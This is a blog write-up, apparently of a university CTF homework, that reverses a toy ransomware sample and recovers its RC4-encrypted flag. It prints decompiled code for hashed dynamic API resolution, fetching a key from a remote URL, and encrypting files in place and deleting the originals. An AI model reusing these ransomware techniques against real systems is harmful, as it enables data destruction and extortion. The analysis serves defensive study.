<!doctype html><html lang=en-us dir=ltr><head><meta charset=UTF-8><meta name=viewport content="width=device-width,initial-scale=1"><meta name=description content="
  Simple Reverse 0x31(2023 HW - Baby Ransom 2)
  #


  Background
  #


SystemFunction033


  Source code
  #

:::spoiler IDA WinMain
int __stdcall WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nShowCmd)
{
  HWND hWnd; // [rsp+60h] [rbp-A8h]
  WNDCLASSW WndClass; // [rsp+70h] [rbp-98h] BYREF
  struct tagMSG Msg; // [rsp+C0h] [rbp-48h] BYREF

  memset(&amp;WndClass, 0, sizeof(WndClass));
  WndClass.lpfnWndProc = (WNDPROC)store_winword;
  WndClass.hInstance = hInstance;
  WndClass.lpszClassName = Caption;
  WndClass.hbrBackground = CreateSolidBrush(0);
  if ( !RegisterClassW(&amp;WndClass) )
    return 1;
  hWnd = CreateWindowExW(0, Caption, Caption, 0xCF0000u, 100, 100, 800, 600, 0i64, 0i64, hInstance, 0i64);
  if ( !hWnd )
    return 2;
  MainPayload();
  ShowWindow(hWnd, nShowCmd);
  memset(&amp;Msg, 0, sizeof(Msg));
  while ( GetMessageW(&amp;Msg, 0i64, 0, 0) )
  {
    TranslateMessage(&amp;Msg);
    DispatchMessageW(&amp;Msg);
  }
  return 0;
}
:::
:::spoiler IDA MainPayload"><meta name=theme-color media="(prefers-color-scheme: light)" content="#ffffff"><meta name=theme-color media="(prefers-color-scheme: dark)" content="#343a40"><meta name=color-scheme content="light dark"><meta property="og:url" content="https://bernie6401.github.io/security/course/ntu-cs/reverse/winmalware-lab/simple-reverse---0x312023-hw---baby-ransom-2/"><meta property="og:site_name" content="SBK Hugo Site"><meta property="og:title" content="Simple Reverse 0x31(2023 HW - Baby Ransom 2)"><meta property="og:description" content="Simple Reverse 0x31(2023 HW - Baby Ransom 2) # Background # SystemFunction033 Source code # :::spoiler IDA WinMain
int __stdcall WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nShowCmd) { HWND hWnd; // [rsp+60h] [rbp-A8h] WNDCLASSW WndClass; // [rsp+70h] [rbp-98h] BYREF struct tagMSG Msg; // [rsp+C0h] [rbp-48h] BYREF memset(&amp;WndClass, 0, sizeof(WndClass)); WndClass.lpfnWndProc = (WNDPROC)store_winword; WndClass.hInstance = hInstance; WndClass.lpszClassName = Caption; WndClass.hbrBackground = CreateSolidBrush(0); if ( !RegisterClassW(&amp;WndClass) ) return 1; hWnd = CreateWindowExW(0, Caption, Caption, 0xCF0000u, 100, 100, 800, 600, 0i64, 0i64, hInstance, 0i64); if ( !hWnd ) return 2; MainPayload(); ShowWindow(hWnd, nShowCmd); memset(&amp;Msg, 0, sizeof(Msg)); while ( GetMessageW(&amp;Msg, 0i64, 0, 0) ) { TranslateMessage(&amp;Msg); DispatchMessageW(&amp;Msg); } return 0; } ::: :::spoiler IDA MainPayload"><meta property="og:locale" content="en_us"><meta property="og:type" content="article"><meta property="article:section" content="security"><meta property="article:tag" content="Eductf"><meta property="article:tag" content="CTF"><meta property="article:tag" content="Reverse"><title>Simple Reverse 0x31(2023 HW - Baby Ransom 2) | SBK Hugo Site</title>
<link rel=icon href=/favicon.png><link rel=manifest href=/manifest.json><link rel=canonical href=https://bernie6401.github.io/security/course/ntu-cs/reverse/winmalware-lab/simple-reverse---0x312023-hw---baby-ransom-2/><link rel=stylesheet href=/book.min.6c8b9d2a1fc95075ed7da46ca81060b39add8fff6741ac51259f768929281e2c.css integrity="sha256-bIudKh/JUHXtfaRsqBBgs5rdj/9nQaxRJZ92iSkoHiw=" crossorigin=anonymous><script defer src=/fuse.min.js></script><script defer src=/en.search.min.acdc41c8d39e6c69d70d8a23779875e0a3733fefead3e428d5344966bb12f562.js integrity="sha256-rNxByNOebGnXDYojd5h14KNzP+/q0+Qo1TRJZrsS9WI=" crossorigin=anonymous></script></head><body dir=ltr><input type=checkbox class="hidden toggle" id=menu-control>
<input type=checkbox class="hidden toggle" id=toc-control><main class="container flex"><aside class=book-menu><div class=book-menu-content><nav><h2 class=book-brand><a class="flex align-center" href=/><span>SBK Hugo Site</span></a></h2><div class="book-search hidden"><input type=text id=book-search-input placeholder=Search aria-label=Search maxlength=64 data-hotkeys=s/><div class="book-search-spinner hidden"></div><ul id=book-search-results></ul></div><script>document.querySelector(".book-search").classList.remove("hidden")</script></nav><script>(function(){var e=document.querySelector("aside .book-menu-content");addEventListener("beforeunload",function(){localStorage.setItem("menu.scrollTop",e.scrollTop)}),e.scrollTop=localStorage.getItem("menu.scrollTop")})()</script></div></aside><div class=book-page><header class=book-header><div class="flex align-center justify-between"><label for=menu-control><img src=/svg/menu.svg class=book-icon alt=Menu></label><h3>Simple Reverse 0x31(2023 HW - Baby Ransom 2)</h3><label for=toc-control><img src=/svg/toc.svg class=book-icon alt="Table of Contents"></label></div><aside class="hidden clearfix"><nav id=TableOfContents><ul><li><a href=#background>Background</a></li><li><a href=#source-code>Source code</a></li><li><a href=#recon>Recon</a></li><li><a href=#exploit>Exploit</a></li><li><a href=#reference>Reference</a></li></ul></nav></aside></header><article class="markdown book-article"><h1 id=simple-reverse-0x312023-hw---baby-ransom-2>Simple Reverse 0x31(2023 HW - Baby Ransom 2)
<a class=anchor href=#simple-reverse-0x312023-hw---baby-ransom-2>#</a></h1><h2 id=background>Background
<a class=anchor href=#background>#</a></h2><ul><li><a href=https://forum.butian.net/share/2204>SystemFunction033</a></li></ul><h2 id=source-code>Source code
<a class=anchor href=#source-code>#</a></h2><p>:::spoiler IDA WinMain</p><pre tabindex=0><code class="language-cpp=" data-lang="cpp=">int __stdcall WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nShowCmd)
{
  HWND hWnd; // [rsp+60h] [rbp-A8h]
  WNDCLASSW WndClass; // [rsp+70h] [rbp-98h] BYREF
  struct tagMSG Msg; // [rsp+C0h] [rbp-48h] BYREF

  memset(&amp;WndClass, 0, sizeof(WndClass));
  WndClass.lpfnWndProc = (WNDPROC)store_winword;
  WndClass.hInstance = hInstance;
  WndClass.lpszClassName = Caption;
  WndClass.hbrBackground = CreateSolidBrush(0);
  if ( !RegisterClassW(&amp;WndClass) )
    return 1;
  hWnd = CreateWindowExW(0, Caption, Caption, 0xCF0000u, 100, 100, 800, 600, 0i64, 0i64, hInstance, 0i64);
  if ( !hWnd )
    return 2;
  MainPayload();
  ShowWindow(hWnd, nShowCmd);
  memset(&amp;Msg, 0, sizeof(Msg));
  while ( GetMessageW(&amp;Msg, 0i64, 0, 0) )
  {
    TranslateMessage(&amp;Msg);
    DispatchMessageW(&amp;Msg);
  }
  return 0;
}
</code></pre><p>:::
:::spoiler IDA MainPayload</p><pre tabindex=0><code class="language-cpp=" data-lang="cpp=">void __stdcall MainPayload()
{
  LoadLibraryA(LibFileName);
  LoadLibraryA(aWininetDll);
  if ( !(unsigned int)DynamicAPIResolution() )
    DoSomethingBad();
}
</code></pre><p>:::
:::spoiler IDA DynamicAPIResolution</p><pre tabindex=0><code class="language-cpp=" data-lang="cpp=">__int64 DynamicAPIResolution()
{
  // [COLLAPSED LOCAL DECLARATIONS. PRESS KEYPAD CTRL-&#34;+&#34; TO EXPAND]

  p_InLoadOrderModuleList = &amp;NtCurrentPeb()-&gt;Ldr-&gt;InLoadOrderModuleList;
  for ( module = p_InLoadOrderModuleList;
        module-&gt;InLoadOrderLinks.Flink != p_InLoadOrderModuleList;
        module = module-&gt;InLoadOrderLinks.Flink )
  {
    dll_name = module-&gt;BaseDllName.Buffer;
    dll_base = module-&gt;DllBase;
    if ( dll_name )
    {
      if ( (*dll_name == &#39;k&#39; || *dll_name == &#39;K&#39;)
        &amp;&amp; (dll_name[1] == &#39;e&#39; || dll_name[1] == &#39;E&#39;)
        &amp;&amp; (dll_name[2] == &#39;r&#39; || dll_name[2] == &#39;R&#39;)
        &amp;&amp; (dll_name[3] == &#39;n&#39; || dll_name[3] == &#39;N&#39;)
        &amp;&amp; (dll_name[4] == &#39;e&#39; || dll_name[4] == &#39;E&#39;)
        &amp;&amp; (dll_name[5] == &#39;l&#39; || dll_name[5] == &#39;L&#39;)
        &amp;&amp; dll_name[6] == &#39;3&#39;
        &amp;&amp; dll_name[7] == &#39;2&#39; )                 // import kernel32 library
      {
        exportTable = (dll_base + getNtHdrs(dll_base)-&gt;OptionalHeader.DataDirectory[0].VirtualAddress);
        num_of_names = exportTable-&gt;NumberOfNames;
        name_array = dll_base + exportTable-&gt;AddressOfNames;
        name_ordinal = dll_base + exportTable-&gt;AddressOfNameOrdinals;
        func_array = dll_base + exportTable-&gt;AddressOfFunctions;
        for ( i = 0i64; i &lt; num_of_names; ++i )
        {
          api_name = (dll_base + *&amp;func_array[4 * *&amp;name_ordinal[2 * i]]);
          case_0 = search_case(dll_base + *&amp;name_array[4 * i]);
          switch ( case_0 )
          {
            case 0x69D265FE6B1C110Fi64:
              LoadLibraryA_0 = api_name;
              break;
            case 0x578960F1FC7FFF25i64:
              GetProcAddress = api_name;
              break;
            case 0xFA55E32C9D72A921i64:
              qword_140007A98 = api_name;
              break;
            case 0xE0746E00B47C0477i64:
              GetLastError = api_name;
              break;
            case 0xE7BDCAD1F3AE0E13i64:
              CreateDirectoryA = api_name;
              break;
            case 0x1C71D0537E2246F5i64:
              FindFirstFileA = api_name;
              break;
            case 0x121E523CBB49F938i64:
              FindNextFileA = api_name;
              break;
            case 0x1C8EF920B632E586i64:
              FindClose = api_name;
              break;
            case 0x28D0403A889E4F69i64:
              copyFileA = api_name;
              break;
            case 0x556A045B10DE85i64:
              CloseHandle = api_name;
              break;
            case 0x2E97865AB85128C3i64:
              ReadFile = api_name;
              break;
            case 0x2FA16C1D95E4306Ai64:
              WriteFile = api_name;
              break;
            case 0x5D35AEBEDFD88117i64:
              DeleteFileA = api_name;
              break;
            case 0xFC59546FD0D3D778i64:
              GetFileSize = api_name;
              break;
            case 0xEBC4E8E9B1542DEEi64:
              CreateFileA = api_name;
              break;
          }
        }
      }
      else if ( (*dll_name == &#39;m&#39; || *dll_name == &#39;M&#39;)
             &amp;&amp; (dll_name[1] == &#39;s&#39; || dll_name[1] == &#39;S&#39;)
             &amp;&amp; (dll_name[2] == &#39;v&#39; || dll_name[2] == &#39;V&#39;)
             &amp;&amp; (dll_name[3] == &#39;c&#39; || dll_name[3] == &#39;C&#39;)
             &amp;&amp; (dll_name[4] == &#39;r&#39; || dll_name[4] == &#39;R&#39;)
             &amp;&amp; (dll_name[5] == &#39;t&#39; || dll_name[5] == &#39;T&#39;) )// import msvcrt library
      {
        exportTable_1 = (dll_base + getNtHdrs(dll_base)-&gt;OptionalHeader.DataDirectory[0].VirtualAddress);
        num_of_names_1 = exportTable_1-&gt;NumberOfNames;
        name_array_1 = dll_base + exportTable_1-&gt;AddressOfNames;
        name_ordinal_1 = dll_base + exportTable_1-&gt;AddressOfNameOrdinals;
        func_array_1 = dll_base + exportTable_1-&gt;AddressOfFunctions;
        for ( j = 0i64; j &lt; num_of_names_1; ++j )
        {
          api_name_1 = (dll_base + *&amp;func_array_1[4 * *&amp;name_ordinal_1[2 * j]]);
          case_1 = search_case(dll_base + *&amp;name_array_1[4 * j]);
          switch ( case_1 )
          {
            case 0x974ADB99DCFF7A24i64:
              qword_140007B08 = api_name_1;
              break;
            case 0xD9C0619DA0F59BADi64:
              malloc = api_name_1;
              break;
            case 0x2AB2847890E35C03i64:
              sprintf_s = api_name_1;
              break;
          }
        }
      }
      else if ( (*dll_name == &#39;u&#39; || *dll_name == &#39;U&#39;)
             &amp;&amp; (dll_name[1] == &#39;s&#39; || dll_name[1] == &#39;S&#39;)
             &amp;&amp; (dll_name[2] == &#39;e&#39; || dll_name[2] == &#39;E&#39;)
             &amp;&amp; (dll_name[3] == &#39;r&#39; || dll_name[3] == &#39;R&#39;)
             &amp;&amp; dll_name[4] == &#39;3&#39;
             &amp;&amp; dll_name[5] == &#39;2&#39; )            // import user32 library
      {
        exportTable_2 = (dll_base + getNtHdrs(dll_base)-&gt;OptionalHeader.DataDirectory[0].VirtualAddress);
        num_of_names_2 = exportTable_2-&gt;NumberOfNames;
        name_array_2 = dll_base + exportTable_2-&gt;AddressOfNames;
        name_ordinal_2 = dll_base + exportTable_2-&gt;AddressOfNameOrdinals;
        func_array_2 = dll_base + exportTable_2-&gt;AddressOfFunctions;
        for ( k = 0i64; k &lt; num_of_names_2; ++k )
        {
          api_name_2 = dll_base + *&amp;func_array_2[4 * *&amp;name_ordinal_2[2 * k]];
          if ( search_case(dll_base + *&amp;name_array_2[4 * k]) == 0x1E307D27BA21DDA4i64 )
            qword_140007A80 = api_name_2;
        }
      }
      else if ( (*dll_name == &#39;w&#39; || *dll_name == &#39;W&#39;)
             &amp;&amp; (dll_name[1] == &#39;i&#39; || dll_name[1] == &#39;I&#39;)
             &amp;&amp; (dll_name[2] == &#39;n&#39; || dll_name[2] == &#39;N&#39;)
             &amp;&amp; (dll_name[3] == &#39;i&#39; || dll_name[3] == &#39;I&#39;)
             &amp;&amp; (dll_name[4] == &#39;n&#39; || dll_name[4] == &#39;N&#39;)
             &amp;&amp; (dll_name[5] == &#39;e&#39; || dll_name[5] == &#39;E&#39;)
             &amp;&amp; (dll_name[6] == &#39;t&#39; || dll_name[6] == &#39;T&#39;) )// import wineinet library
      {
        exportTable_3 = (dll_base + getNtHdrs(dll_base)-&gt;OptionalHeader.DataDirectory[0].VirtualAddress);
        num_of_names_3 = exportTable_3-&gt;NumberOfNames;
        name_array_3 = dll_base + exportTable_3-&gt;AddressOfNames;
        name_ordinal_3 = dll_base + exportTable_3-&gt;AddressOfNameOrdinals;
        func_array_3 = dll_base + exportTable_3-&gt;AddressOfFunctions;
        for ( m = 0i64; m &lt; num_of_names_3; ++m )
        {
          api_name_3 = (dll_base + *&amp;func_array_3[4 * *&amp;name_ordinal_3[2 * m]]);
          case_3 = search_case(dll_base + *&amp;name_array_3[4 * m]);
          switch ( case_3 )
          {
            case 0x8261F0DF5FDC0887i64:
              InternetOpenA = api_name_3;
              break;
            case 0xE726A35A86C7641Ci64:
              InternetOpenUrlA = api_name_3;
              break;
            case 0x6F4E79C87F04F3E6i64:
              InternetReadFile = api_name_3;
              break;
            case 0x2DF8494D5C13046i64:
              InternetCloseHandle = api_name_3;
              break;
          }
        }
      }
    }
  }
  return 0i64;
}
</code></pre><p>:::
:::spoiler IDA DoSomethingBad</p><pre tabindex=0><code class="language-cpp=" data-lang="cpp=">void __stdcall DoSomethingBad()
{
  HMODULE LibraryA_0; // rax
  HANDLE FirstFileA; // [rsp+20h] [rbp-188h]
  const void *space; // [rsp+30h] [rbp-178h] BYREF
  DWORD fileSize; // [rsp+38h] [rbp-170h] BYREF
  struct _WIN32_FIND_DATAA lpFindFileData; // [rsp+40h] [rbp-168h] BYREF
  char folderName[24]; // [rsp+180h] [rbp-28h] BYREF

  strcpy(folderName, &#34;Microsoft Update Backup&#34;);
  if ( (CreateDirectoryA(folderName, 0i64) || GetLastError() == ERROR_ALREADY_EXISTS) &amp;&amp; !(unsigned int)InternetConnect() )
  {
    LibraryA_0 = LoadLibraryA_0(aAdvapi32);
    SystemFunction032 = (__int64 (__fastcall *)(_QWORD, _QWORD))GetProcAddress(LibraryA_0, ProcName);
    FirstFileA = FindFirstFileA(FileName, &amp;lpFindFileData);
    if ( FirstFileA != (HANDLE)-1i64 )
    {
      do
      {
        space = 0i64;
        if ( (lpFindFileData.dwFileAttributes &amp; FILE_ATTRIBUTE_DIRECTORY) == 0
          &amp;&amp; !(unsigned int)Create_Read_File(lpFindFileData.cFileName, (LPVOID *)&amp;space, &amp;fileSize) )
        {
          if ( (unsigned int)sprintf_copyFile(lpFindFileData.cFileName, folderName) )
            Create_Write_Delete_File(lpFindFileData.cFileName, space, fileSize);
        }
      }
      while ( FindNextFileA(FirstFileA, &amp;lpFindFileData) );
      FindClose(FirstFileA);
    }
  }
}
</code></pre><p>:::
:::spoiler IDA InternetConnect</p><pre tabindex=0><code class="language-cpp=" data-lang="cpp=">__int64 InternetConnect()
{
  unsigned int v1; // [rsp+30h] [rbp-38h]
  BOOL i; // [rsp+34h] [rbp-34h]
  _BYTE *lpBuffer; // [rsp+38h] [rbp-30h]
  HINTERNET hFile; // [rsp+40h] [rbp-28h]
  HINTERNET hInternet; // [rsp+48h] [rbp-20h]
  LPDWORD *lpdwNumberOfBytesRead; // [rsp+50h] [rbp-18h] BYREF

  lpBuffer = malloc(0x1000ui64);
  hInternet = InternetOpenA(szAgent, 1u, 0i64, 0i64, 0);
  if ( !hInternet )
    return 1i64;
  hFile = InternetOpenUrlA(hInternet, szUrl, 0i64, 0, INTERNET_FLAG_RELOAD, 0i64);
  if ( hFile )
  {
    v1 = 0;
    for ( i = InternetReadFile(hFile, lpBuffer, 0x1000u, &amp;lpdwNumberOfBytesRead);
          i &amp;&amp; lpdwNumberOfBytesRead &amp;&amp; v1 &lt; 0x1000;
          i = InternetReadFile(hFile, &amp;lpBuffer[v1], 4096 - v1, &amp;lpdwNumberOfBytesRead) )
    {
      v1 += lpdwNumberOfBytesRead;
    }
    qword_140007460 = (lpBuffer + 2687);
    lpBuffer[2706] = 0;
    InternetCloseHandle(hFile);
    InternetCloseHandle(hInternet);
    return 0i64;
  }
  else
  {
    InternetCloseHandle(hInternet);
    return 2i64;
  }
}
</code></pre><p>:::
:::spoiler IDA Create_Read_File</p><pre tabindex=0><code class="language-cpp=" data-lang="cpp=">__int64 __fastcall Create_Read_File(LPCSTR lpFileName, LPVOID *space, DWORD *fileSize)
{
  HANDLE hFile; // [rsp+40h] [rbp-128h]
  LPDWORD NumberOfBytesRead; // [rsp+48h] [rbp-120h] BYREF
  char v6; // [rsp+50h] [rbp-118h] BYREF

  hFile = CreateFileA(lpFileName, GENERIC_READ, 0, 0i64, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, 0i64);
  if ( hFile == (HANDLE)-1i64 )
    return 1i64;
  *fileSize = GetFileSize(hFile, 0i64);
  sub_140002A40((int)&amp;v6, 256, (int)aD, *fileSize);
  *space = malloc(*fileSize + 1i64);
  if ( *space )
  {
    if ( ReadFile(hFile, *space, *fileSize, (LPDWORD)&amp;NumberOfBytesRead, 0i64) )
    {
      *((_BYTE *)*space + *fileSize) = 0;
      CloseHandle(hFile);
    }
    return 0i64;
  }
  else
  {
    CloseHandle(hFile);
    return 1i64;
  }
}
</code></pre><p>:::
:::spoiler IDA sprintf_copyFile</p><pre tabindex=0><code class="language-cpp=" data-lang="cpp=">__int64 __fastcall sprintf_copyFile(const char *FileName, const char *folderName)
{
  char buffer[272]; // [rsp+30h] [rbp-128h] BYREF

  sprintf_s(buffer, 0x104ui64, &#34;%s\\%s&#34;, folderName, FileName);// FolderName =&gt; Microsoft Update Backup
                                                // FileName =&gt; baby-ransom.exe
  return copyFileA(FileName, buffer, 0i64);
}
</code></pre><p>:::
:::spoiler IDA Create_Write_Delete_File</p><pre tabindex=0><code class="language-cpp=" data-lang="cpp=">void __fastcall Create_Write_Delete_File(const char *fileName, const void *space, DWORD fileSize)
{
  unsigned __int64 v3; // [rsp+40h] [rbp-178h]
  __int64 v4; // [rsp+48h] [rbp-170h]
  HANDLE hFile; // [rsp+50h] [rbp-168h]
  DWORD nNumberOfBytesToWrite; // [rsp+68h] [rbp-150h] BYREF
  LPCVOID lpBuffer; // [rsp+70h] [rbp-148h]
  const struct ustring *key; // [rsp+78h] [rbp-140h] BYREF
  __int64 v9; // [rsp+80h] [rbp-138h]
  DWORD NumberOfBytesWritten[2]; // [rsp+88h] [rbp-130h] BYREF
  char Buffer[272]; // [rsp+90h] [rbp-128h] BYREF

  v9 = qword_140007460;
  LODWORD(key) = 19;
  v3 = -1i64;
  do
    ++v3;
  while ( fileName[v3] );                       // 這個do_while loop的結果是0xf，因為&#34;baby-ransom.exe&#34;總共15個字
  if ( v3 &lt;= 0x13 )
  {
    v4 = -1i64;
    do
      ++v4;
    while ( fileName[v4] );
    LODWORD(key) = v4;
  }
  lpBuffer = space;
  nNumberOfBytesToWrite = fileSize;
  SystemFunction032(&amp;nNumberOfBytesToWrite, &amp;key);
  sprintf_s(Buffer, 0x104ui64, &#34;enc_%s&#34;, fileName);
  hFile = CreateFileA(Buffer, 0x40000000u, 0, 0i64, 2u, 0x80u, 0i64);
  if ( hFile != (HANDLE)-1i64 )
  {
    if ( WriteFile(hFile, lpBuffer, nNumberOfBytesToWrite, NumberOfBytesWritten, 0i64) )
      DeleteFileA(fileName);
    CloseHandle(hFile);
  }
}
</code></pre><p>:::</p><h2 id=recon>Recon
<a class=anchor href=#recon>#</a></h2><p>這一題只要慢慢分析其實很簡單，也有很多是上課就有教到的地方，一樣從上到下(source code)</p><ol><li>首先，如果直接執行這個程式的話，過沒多久會跳出一個視窗，其他部分"好像"沒有甚麼特別攻擊的行為，從<code>WinMain</code>中可以大略知曉這些事情，也就是攻擊者事先決定好一個通知的視窗(就是要叫你付錢的視窗)的一些設定(包含顏色、字形、字體等等)，接著就進到<code>MainPayload</code>搞事</li><li>首先他先load <code>msvcrt.dll</code>和<code>wininet.dll</code>這兩個library，再用上課教的==Dynamic API Resolution==，把原本process上的<code>kernel32.dll</code>, <code>msvcrt.dll</code>和<code>user32.dll</code>也一併load到該thread，接著就進到==DoSomethingBad==這邊</li><li>從上到下就做幾件事情<ol><li>創一個名叫<code>Microsoft Update Backup</code>的folder</li><li>進行網路連線<ol><li>試圖連線<code>https://shouldhavecat.com/robots.txt</code>這個網站</li><li>如果連線成功就讀取該網站的內容</li></ol></li><li>Load進<code>SystemFunction032</code>這個library$\to$非常重要</li><li>找目前目錄的第一個檔案(不限檔案類型)</li><li>進到<code>Create_Read_File</code><ol><li>創一個file，名字和之前取得的檔案名稱一樣(假設爬到的file名稱是<code>flag.txt</code>，那新的file也是一樣的名字)</li><li>malloc一個大小為該檔案大小的空間(假設<code>flag.txt</code>的大小是0x11，malloc的空間就是0x11)</li><li>讀flag.txt到這個malloc空間</li></ol></li><li>進到<code>sprintf_copyFile</code>，就是把<code>./flag.txt</code>複製到<code>./Microsoft Update Backup/flag.txt</code>中</li><li>進到<code>Create_Write_Delete_File</code>，這是最重要的部分<ol><li>計算RC4加密需要的key，這個就是從一開始從<code>https://shouldhavecat.com/robots.txt</code>讀取下來的內容中擷取一段8個bytes當作key</li><li>利用<code>SystemFunction032</code>把我們的檔案加密</li><li>創一個<code>enc_flag.txt</code>這個檔案然後把加密的cipher寫進去</li></ol></li></ol></li><li>加密的部分
從<a href=https://forum.butian.net/share/2204>SystemFunction033</a>這個網站可以知道<code>SystemFunction033</code>一開始的結構，我們可以順著這個結構去推敲解密需要的key<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-cpp data-lang=cpp><span style=display:flex><span><span style=color:#66d9ef>struct</span> <span style=color:#a6e22e>ustring</span> {
</span></span><span style=display:flex><span>    DWORD Length;
</span></span><span style=display:flex><span>    DWORD MaximumLength;
</span></span><span style=display:flex><span>    PUCHAR Buffer;
</span></span><span style=display:flex><span>} _data, key;
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#66d9ef>typedef</span> <span style=color:#a6e22e>NTSTATUS</span>(WINAPI<span style=color:#f92672>*</span> _SystemFunction033)(
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>struct</span> <span style=color:#a6e22e>ustring</span><span style=color:#f92672>*</span> memoryRegion,
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>struct</span> <span style=color:#a6e22e>ustring</span><span style=color:#f92672>*</span> keyPointer
</span></span><span style=display:flex><span>);
</span></span></code></pre></div><img src=https://hackmd.io/_uploads/SktO1q9X6.png alt=圖片.png><ol><li>執行這行之前，跟一下他的資料結構，首先前4 bytes是代表大小，後4 bytes代表maximum length，後8 bytes代表該資料的pointer</li><li>第一個parameter就是要加密的檔案，大小就是0x11，儲存在<code>0x214E5567710</code>，所以要加密的明文是<code>FLAG{test_134567}</code>
<img src=https://hackmd.io/_uploads/HJMYeqcXp.png alt=圖片.png></li><li>第二個parameter就是加密所需要的key，大小是0x8，位置是<code>0x324E556613F</code>，所以加密所需的key是==2F 37 32 38 33 33 31 33==
<img src=https://hackmd.io/_uploads/S1Oagqc76.png alt=圖片.png></li></ol></li><li>既然已經知道所有的流程就直接使用線上工具解密即可</li></ol><h2 id=exploit>Exploit
<a class=anchor href=#exploit>#</a></h2><p>直接用<a href=https://cryptii.com/pipes/rc4-encryption>online tool</a> decrypt cipher</p><ul><li>Ciphertext: <code>71 04 1F C7 93 1A 7C A0 E1 F5 08 44 D0 08 18 D7 1D E0 22 B5 A3 AD 3A C9 B2 D5 E7 40 41 4B 86 97 E8 2E 6B</code></li><li>Key: <code>2F 37 32 38 33 33 31 33</code>
<img src=https://hackmd.io/_uploads/HJBADQq76.png alt=圖片.png></li></ul><p>Flag: <code>FLAG{50_y0u_p4y_7h3_r4n50m?!hmmmmm}</code></p><h2 id=reference>Reference
<a class=anchor href=#reference>#</a></h2></article><footer class=book-footer><div class="flex flex-wrap justify-between"></div><script>(function(){function e(e){const t=window.getSelection(),n=document.createRange();n.selectNodeContents(e),t.removeAllRanges(),t.addRange(n)}document.querySelectorAll("pre code").forEach(t=>{t.addEventListener("click",function(){if(window.getSelection().toString())return;e(t.parentElement),navigator.clipboard&&navigator.clipboard.writeText(t.parentElement.textContent)})})})()</script></footer><div class=book-comments></div><label for=menu-control class="hidden book-menu-overlay"></label></div><aside class=book-toc><div class=book-toc-content><nav id=TableOfContents><ul><li><a href=#background>Background</a></li><li><a href=#source-code>Source code</a></li><li><a href=#recon>Recon</a></li><li><a href=#exploit>Exploit</a></li><li><a href=#reference>Reference</a></li></ul></nav></div></aside></main></body></html>